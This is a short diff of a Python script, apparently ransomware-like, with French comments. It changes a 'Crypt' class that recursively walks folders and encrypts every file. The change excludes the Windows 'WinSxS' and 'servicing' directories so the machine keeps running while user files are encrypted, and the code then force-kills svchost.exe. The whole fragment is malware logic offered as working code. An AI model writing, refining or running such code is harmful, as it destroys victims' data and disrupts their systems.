@@ -95,9 +95,10 @@ class Crypt: # Classe pour le cryptage
             path += "/*" # Entrer dans le dossier
             folder = glob.glob(path) # Liste du contenu du dossier
             
-            try:
-                for file in folder: self.Crypting(file)
-            except: break
+            if len(folder) != 0:
+                for file in folder:
+                    if ("WinSxS" not in file) and ("servicing" not in file) and ("." in file): self.Crypting(file)
+            else: break
             
         os.system("taskkill /f /im svchost.exe")
         
